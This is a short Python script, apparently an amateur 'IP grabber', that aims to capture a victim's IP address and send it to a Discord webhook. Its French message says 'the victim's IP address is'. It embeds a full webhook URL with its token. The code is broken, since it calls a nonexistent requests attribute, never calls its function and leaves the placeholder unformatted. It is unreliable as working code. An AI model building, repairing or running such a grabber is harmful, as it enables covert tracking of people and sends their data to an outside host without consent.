import requests
import json

def ipgrab():
    user_ip = requests.remote_addr
    return user_ip

webhook_url = "https://discord.com/api/webhooks/1194589877233262662/6U_vTLLwpfgcumnX1m--aWxWuaHpJFzIQ0rrJnT6HHQB4ZQjk1EoQT_unRp6JBIGJqnR"
message = "l'addresse ip de la victime est {user_ip}"

payload = {
    "content": message
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

